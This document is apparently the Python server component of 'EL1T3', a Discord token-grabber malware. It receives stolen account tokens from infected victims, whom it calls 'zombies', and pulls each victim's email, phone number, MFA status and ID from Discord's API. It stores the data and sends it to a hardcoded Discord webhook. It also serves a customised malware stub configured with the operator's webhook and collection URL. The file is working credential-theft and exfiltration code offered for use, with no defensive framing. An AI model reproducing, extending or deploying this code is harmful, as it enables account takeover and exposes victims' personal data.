#~~~~                                      ~~~~#
# "тнe мoѕт αdvαɴced αɴd powerғυl тoĸeɴ ɢrαввer"
#                ιтѕ_Ѵιcнч#1337                #
#~~        github.com/Its-Vichy/EL1T3        ~~#
#~~~~                                      ~~~~#

from discord_webhook import DiscordWebhook, DiscordEmbed
from flask import request, make_response
from tinydb import TinyDB, Query
import flask, requests, json

class Cache():
    def __init__(self):
        self.Tokens = []
        self.Zombies = []
        self.ZombieNumber = len(self.Zombies)

    def GetZombiesNumber(self):
        return self.ZombieNumber

    def AddZombie(self, Token, hook, table = None, Checker = None):
        if Token[:20] not in self.Tokens:
            self.Zombies.append(Token)
            self.Tokens.append(Token[:20])

            if table != None:
                
                Discriminator = Checker.GetDiscriminator()
                Username = Checker.GetUsername()
                Verified = Checker.GetVerified()
                Email = Checker.GetEmailAddr()
                Country = Checker.GetCountry()
                Phone = Checker.GetPhone()
                Nsfw = Checker.GetNsfw()
                Mfa = Checker.GetMfa()
                Id = Checker.GetId()

                webhook = DiscordWebhook(url="https://discord.com/api/webhooks/823582382644527214/ZvvyDW2p3XxC__JZnYXobe-pMfOUUwIBJy32Ru306VAZ86y8MGkKmwvSR5cQ5kzVWf8N", username="EL1T3")

                embed = DiscordEmbed(color='000001', description= "[**Github**](https://github.com/Its-Vichy) | [**YouTube**](https://www.youtube.com/channel/UC09GPm24_rdeOXa5KOmhDnw) | [**Discord**](https://discord.gg/3UspqWXZtD) | [**PyPI Package**](https://pypi.org/project/EL1T3)")
                embed.set_footer(text="https://github.com/Its-Vichy/EL1T3")
                embed.set_timestamp()
                embed.set_thumbnail(url=Checker.GetAvatar())
                                
                embed.add_embed_field(name="Token", value=f"`{Token}`", inline=False)
                embed.add_embed_field(name="Email", value=f"`{Email}`", inline=False)
                embed.add_embed_field(name="Username", value=f"`{Username}#{Discriminator}`", inline=False)
                embed.add_embed_field(name="Verified", value=f"`{Verified}`", inline=False)
                embed.add_embed_field(name="Country", value=f"`{Country}`", inline=False)
                embed.add_embed_field(name="Phone", value=f"`{Phone}`", inline=False)
                embed.add_embed_field(name="Nsfw", value=f"`{Nsfw}`", inline=False)
                embed.add_embed_field(name="Mfa", value=f"`{Mfa}`", inline=False)
                embed.add_embed_field(name="Id", value=f"`{Id}`", inline=False)

                webhook.add_embed(embed)
                webhook.execute()
                table.insert({'Token':Token, 'Email': Email, 'Discriminator': Discriminator,'Username': Username,'Verified': Verified,'Country': Country,'Phone': Phone,'Nsfw': Nsfw,'Id': Id,'Mfa': Mfa})

    def LoadZombies(self):
        with open('./json/Database.json', 'r+') as DbFile:
            Db = json.load(DbFile)

            for Zombies in Db['Accounts']:
                Token = Db['Accounts'][Zombies]['Token']
                
                if Token not in self.Zombies:
                    self.Zombies.append(Token)
                    self.Tokens.append(Token[:20])
                
class TokenTools():
    def __init__(self, Token):
        self.CheckerUrl = f'https://discordapp.com/api//sso?token={Token}'
        self.InfoUrl    = 'https://discordapp.com/api/v8/users/@me'
        self.Headers    = {'Authorization': Token, 'content-type': 'application/json'}
        self.Info       = requests.get(self.InfoUrl, headers=self.Headers).json()

    def IsDisabled(self):
        if 'Unauthorized' in self.Info:
            return True
        else:
            return False
    
    def GetEmailAddr(self):
        return self.Info['email']

    def GetUsername(self):
        return self.Info['username']

    def GetId(self):
        return self.Info['id']
    
    def GetDiscriminator(self):
        return self.Info['discriminator']

    def GetCountry(self):
        return self.Info['locale']

    def GetMfa(self):
        return self.Info['mfa_enabled']

    def GetVerified(self):
        return self.Info['verified']

    def GetPhone(self):
        return self.Info['phone']

    def GetNsfw(self):
        return self.Info['nsfw_allowed']

    def GetAvatar(self):
        return f"https://cdn.discordapp.com/avatars/{self.Info['id']}/{self.Info['avatar']}.png"

class API():
    def __init__(self, port, hook):
        self.db    = TinyDB('./json/Database.json')
        self.app   = flask.Flask(__name__)
        self.Cache = Cache()
        self.port  = port
        self.hook  = hook

        app        = self.app

        def RegisterToken(Token):
            Checker = TokenTools(Token)

            if Checker.IsDisabled() == True:
                return
            else:
                self.Cache.AddZombie(Token, self.hook, self.db.table('Accounts'), Checker)

        @app.errorhandler(404)
        def PageNotFound(e):
            return "Error 404 ;(", 404

        @app.route('/api/SendToken/', methods=['POST'])
        def SendToken():
            Token = request.args.get('Token')
            RegisterToken(Token)
            return 'Sucess'

        @app.route('/api/GrabberCode/<api_url>/<dynamic>/<Webhook_id>/<Webhook_token>', methods=['POST'])
        def SendCode(api_url=None, dynamic=None, Webhook_id= None, Webhook_token= None):
            Code = ''
            with open("./src/stub.txt", "r") as f:
                for line in f:
                    Code += line
            
            FinalCode = Code.replace('WEBHOOKURLHERE', f'https://discord.com/api/webhooks/{Webhook_id}/{Webhook_token}').replace('APIURLHERE', 'http://' + api_url + '/api/SendToken/?Token=').replace('DYNAMICHERE', 'False' if dynamic == 'FALSE' else 'True')
            print(FinalCode)
            response = make_response(FinalCode, 200)
            response.mimetype = "text/plain"
            return response

    def run(self):
        self.Cache.LoadZombies()
        self.app.run(host= '0.0.0.0', port= self.port)

with open('./json/Config.json') as config_file:
    config = json.load(config_file)

    API(config['port'], config['hook']).run()